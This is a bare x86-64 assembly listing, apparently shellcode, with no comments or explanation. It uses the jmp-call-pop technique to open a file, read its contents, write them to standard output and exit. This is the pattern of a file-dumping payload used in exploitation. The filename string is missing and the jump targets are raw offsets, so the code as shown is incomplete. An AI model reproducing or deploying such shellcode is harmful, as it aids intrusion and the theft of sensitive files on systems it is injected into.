BITS 64
section .text
global _start
_start:
    jmp short 0x41
    pop rdi
    xor byte [rdi+0xb],0x41
    xor rax,rax
    add al,0x2
    xor rsi,rsi
    syscall
    sub sp,0xfff
    lea rsi,[rsp]
    mov rdi,rax
    xor rdx,rdx
    mov dx,0xfff
    xor rax,rax
    syscall
    xor rdi,rdi
    add dil,0x1
    mov rdx,rax
    xor rax,rax
    add al,0x1
    syscall
    xor rax,rax
    add al,0x3c
    syscall
    call 0x2
